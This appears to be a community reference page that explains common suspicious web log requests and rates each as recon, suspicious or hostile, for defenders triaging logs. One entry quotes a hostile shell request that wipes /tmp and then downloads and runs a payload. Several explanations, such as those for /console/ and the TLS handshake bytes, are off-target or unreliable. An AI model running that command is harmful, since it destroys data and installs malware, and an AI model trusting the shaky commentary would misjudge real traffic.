# webtraffic-reference
This page is dedicated to assisting the community with interpreting web logs

# disclaimer

This page is for informational and educational purposes **only**. Interpretation of data is highly specific to individual organzations and their specific applications. Blocking traffic or declaring an incident should occur only after a proper investigation and vetting of data relevant to the specific circumstances is performed. 

# data presentation

The data here is presented with a "log entry" in bold (e.g. **GET /robots.txt**) followed by commentary underneath. Again, this is for informational purposes only. Use at your own risk. 

Recon = Attempts to identify if systems respond to a request. 

Suspicious = Likely associated with some measure of potentially hostile activity, though not overtly hostile in its request. Meaning, the request itself isn't necessarily hostile in nature but is likely part of a systemic attempt to perform non-sanctioned activity. 

Hostile = A request which is, more than likely, overtly hostile in nature. 
_________________

# References

**\x16\x03\x01**

The string "\x16\x03\x01" is a representation of binary data in hexadecimal format and is commonly associated with the Transport Layer Security (TLS) protocol. It is often seen in logs related to web servers and security incidents. 
The string "\x16\x03\x01" is just the start of a TLS 1.0 handshake, i.e. content type (0x16 = handshake) followed by TLS version.
The presence of this string in web server logs may indicate an attempt to exploit a vulnerability in the TLS protocol or to perform a man-in-the-middle attack.
_________________
**GET /robots.txt HTTP/1.1**

A robots.txt file is a text file that is used to instruct web robots (also known as web crawlers or spiders) which pages or sections of a website they are allowed to access and crawl. This is likely not an indicator of attack by itself. 
_________________
**GET /favicon.ico HTTP/1.1**

A favicon.ico is a small icon associated with a particular website or web page that is displayed in the browser's address bar, bookmarks, and tabs. 
It is also known as a shortcut icon, website icon, tab icon, URL icon, or bookmark icon2. A get request for favicon.ico is likely not an indicator of attack by itself. 
_________________
**GET /sendgrid.env HTTP/1.1**

Likely: Suspicious

The presence of this request in the log files likely indicates and attempt to GET Sendgrid API Credentials. A request of this nature should generally be considered suspicious unless it is part of some authorized activity. Often, this type of activity leads to attempts to abuse the SendGrid API. 
https://stackoverflow.com/questions/71330025/how-do-i-implement-sendgrid-env-file
_________________
**GET /actuator/gateway/routes HTTP/1.1**

Likely: Suspicious

This request is associated with Spring.io Actuator API and is consistent with a request to GET routes. The documentation for the Actualor API shows this URL described as "To retrieve the routes defined in the gateway, make a GET request to /actuator/gateway/routes." An organization may consider this recon activity or otherwise suspicious. Our review of this in most circumstances is that this is suspicious. 
_________________
**GET /.env**

This is consistent with an attempt to get environmental variables from a server. Likely suspicious and abnormal. 
_________________
**GET /_ignition/execute-solution HTTP/1.1**

Likely: Suspicious

This is a HTTP request that is related to the Ignition package in Laravel, a popular PHP web application framework. This is possibly an attacker attempting to exploit Ignition. 
https://stackoverflow.com/questions/58249085/how-to-solve-facade-ignition-http-middleware-ignitionenabled
_________________
**GET /.well-known/security.txt HTTP/1.1**

The "security.txt" file is typically placed in the ".well-known" directory of a website, which is a base directory for "well known" locations defined in RFC 5785.  A well-known URI is a URI [RFC3986] whose path component begins with
the characters "/.well-known/", and whose scheme is "HTTP", "HTTPS", or another scheme that has explicitly been specified to use well-known URIs. The "security.txt" file is designed to be machine- and human-readable, and it can be used by security researchers to easily report security vulnerabilities to website owners. In summary, "GET /.well-known/security.txt" is a HTTP request for a file named "security.txt" that is used to define security policies for a website. The file is typically placed in the ".well-known" directory of a website and contains information about a company's security policy, including a vulnerability disclosure policy, a security point of contact, and additional data.
https://datatracker.ietf.org/doc/html/rfc5785#section-3
_________________
**GET /console/ HTTP/1.1**

Likely: Suspicious

"GET /console/" is likely a HTTP request for a console or terminal application, like several console or terminal applications, including Get Console, a powerful and complete terminal app that provides physical serial console access to network and other equipment as well as SSHv2, Telnet, and other protocols. Get Console is the first and only Apple approved iPad app that allows for physical serial connectivity in a terminal app - it also does Telnet, SSH, converts SecureCRT and PuTTY files and is fully scriptable. 
https://www.youtube.com/watch?v=mll_SKgSbok
https://apps.apple.com/us/app/get-console/id412067943
_________________
**GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1**

Likely: Suspicious

"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" is a HTTP request that includes a parameter for starting a debugging session with the PHPStorm IDE. The "XDEBUG_SESSION_START" parameter is used to initiate a debugging session with the Xdebug extension for PHP, which is commonly used for debugging PHP applications. This request can also be exploited by attackers to gain unauthorized access to a server or application if the server is not properly secured or if the Xdebug extension is not configured correctly. 
https://laracasts.com/series/phpstorm-for-laravel-developers
https://www.jetbrains.com/phpstorm/features/ 
_________________
**GET /druid/index.html**

It is possible that the request is related to accessing the index.html page of the Apache Druid web interface.Apache Druid is an open-source distributed data store designed for real-time analytics. It provides a web interface that allows users to interact with and query the data stored in Druid clusters. The index.html page is the entry point for accessing the web interface.
https://trino.io/episodes/16.html
_________________
**GET /solr/admin/info/system?wt=json HTTP/1.1**

Likely: Suspicious

This request is associated with an attempt to retrieve system information from a Solr instance. The "/solr/admin/info/system?wt=json" endpoint is a well-known exploit that can be used to retrieve system information from a Solr instance. 
https://sitecore.stackexchange.com/questions/29494/solr-suspicious-behavior 
_________________
**GET /owa/auth/x.js HTTP/1.1**

Likely: Suspicious

Recon attempts to identify Exchange Servers related to Hafnium Attack. 
https://learn.microsoft.com/en-us/answers/questions/571434/bad-actors-targeted-exchange-owa-auth-x-js
_________________
**GET /mPlayer HTTP/1.1**

Likely: Recon

This appears to be related to mPlayer software associated with Linux. The presence of this request in honeypots is a curiousity. 
_________________
**GET /download/file.ext HTTP/1.1**

Likely: Recon

This request shows up in recon attempts and can often be seen alongside requests for /mPlayer. There is evidence to support that this is looking for misconfigured servers where a default reference to file.ext has been left in the configuration.
_________________
**GET /portal/redlion HTTP/1.1**

Likely: Recon

Recon attempts looking for RedLion automation/manufacturing software systems. 
https://www.redlion.net/portfolio/secure-remote-access-platform
_________________
GET /shell?cd+/tmp;rm+-rf+*;wget+ 10.1.1.1/jaws;sh+/tmp/jaws

NOTE: In the log example ablve, an IP address 10.1.1.1 has been inserted to represent an internal IP address which shows up in the logs. This is for demonstration purposes.

Likely: Hostile

This request is attempting to utilize Shell to download and execute remote code from an IP address. In cases such as this, a secured server would respond with a 404 Not Found. A 404 not found response means that nothing has happened outside of a request to execute on this.
_________________
**SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1**

Likely: Recon

This is a Microsoft SSTP Point to Point traffic request over HTTPS, consistent with RFC 1945, RFC 2616 and RFC 2818. 

Example redacted log:
<155>Aug 11 15:00:00 <REDACTED> apache-access <REDACTED IP> - - [TIMESTAMP] "SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1" 400 2369 "-" "-"

